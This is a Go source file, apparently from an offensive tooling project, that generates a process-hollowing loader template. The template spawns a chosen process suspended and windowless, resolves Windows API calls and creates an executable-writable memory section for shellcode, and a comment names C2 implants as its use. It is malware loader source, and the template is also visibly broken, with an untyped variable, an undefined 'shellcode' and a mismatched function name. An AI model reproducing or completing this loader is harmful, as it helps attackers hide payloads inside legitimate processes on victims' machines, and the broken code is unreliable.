package loaders

import (
	"fmt"
)

/*
   For more information, feel free to read this:
   https://www.blackhat.com/docs/asia-17/materials/asia-17-KA-What-Malware-Authors-Don't-Want-You-To-Know-Evasive-Hollow-Process-Injection-wp.pdf
*/

func GetProcessHollowingTemplate(targetProcess string) string {
	return fmt.Sprintf(`
    package main

import (
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40

    SEC_COMMIT          = 0x08000000
    SECTION_ALL_ACCESS  = 0x000F001F
    CREATE_SUSPENDED    = 0x00000004
    DETACHED_PROCESS    = 0x00000008
    CREATE_NO_WINDOW    = 0x08000000
)

var (
	kernel32 = syscall.MustLoadDLL("kernel32.dll")
	ntdll    = syscall.MustLoadDLL("ntdll.dll")

    zwCreateSection = ntdll.MustFindProc("ZwCreateSection")

	virtualAlloc = kernel32.MustFindProc("VirtualAlloc")
	rtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
	createThread  = kernel32.MustFindProc("CreateThread")
    createProcess = kernel32.MustFindProc("CreateProcess")
    resumeThread = kernel32.MustFindProc("ResumeThread")
)

func loadProcess(target string) *syscall.ProcessInformation {
    var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	commandLine, err := syscall.UTF16PtrFromString(target)

	if err != nil {
		panic(err)
	}

    err = syscall.CreateProcess(
		nil,
		commandLine,
		nil,
		nil,
		false,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,
		nil,
		nil,
		&si,
		&pi)

    // defer syscall.CloseHandle(pi.Thread)
	// defer syscall.CloseHandle(pi.Process)

	if err != nil {
		panic(err)
	}

    println("[+] Created process in suspended state")

	return &pi
}

func ExecuteOrderSixtySix(payload []byte) {
    process := loadProcess("%s")


    var hShellcode
    sectionSize := int64(len(shellcode))
    _, _, _ = ZwCreateSection.Call(
        uintptr(unsafe.Pointer(&hShellcode)),
        SECTION_ALL_ACCESS,
        nil,
        uintptr(unsafe.Pointer(sectionSize)),
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        nil,
    )



    /* block, so that process does not die (useful for C2 implants) */
    select {}
}
    `, targetProcess)
}
